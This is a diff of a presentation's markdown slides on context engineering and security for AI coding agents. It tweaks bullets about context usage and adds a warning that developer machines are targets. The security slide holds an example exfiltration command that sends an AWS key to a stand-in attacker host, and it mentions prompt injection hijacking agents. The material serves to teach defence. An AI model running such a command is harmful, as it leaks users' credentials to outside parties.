@@ -73,15 +73,13 @@ layoutClass: gap-8
 
 Context engineering is having the most relevant tokens in the context window for current task.
 
-<div class="text-amber-400 font-bold mt-2 mb-4">Important</div>
-
-- Knowledge is POWER
+- Knowledge is power
 - Aim for 40-50% max usage
 - Layered CLAUDE.md files
+- Protect your context
 - `/context` to visualize
 - `/clear` to reset
-- `/compact` command
-- Protect your context
+- `/compact` command to disable
 
 ::right::
 
@@ -114,6 +112,7 @@ Stale memory files are your biggest enemy when trying to be productive.
 - **Sandboxing** — Run Coding Agents in a isolated environment (Docker Sandbox, VPS, YOLO)
 - **Prompt injection** — Untrusted input can hijack agents
 - **Network access** — `curl attacker.com?secret=$AWS_KEY`
+- **Dev machines are targets** - Beware
 
 <!--
 Brief but important. Prompt injection is the XSS of AI.
